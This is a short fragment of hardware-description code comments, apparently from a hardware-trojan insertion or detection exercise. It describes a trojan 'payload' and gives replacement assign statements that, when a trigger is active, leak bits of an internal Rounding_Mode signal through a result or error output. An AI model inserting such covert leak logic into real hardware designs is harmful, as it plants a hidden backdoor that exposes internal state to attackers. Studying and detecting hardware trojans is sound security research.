 ...
 * Payload: Route result[0] to observable output
 * 
...
//   Replace with:
//     assign result = trojan_active ? Rounding_Mode[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? Rounding_Mode[0] : 1'b0;
//
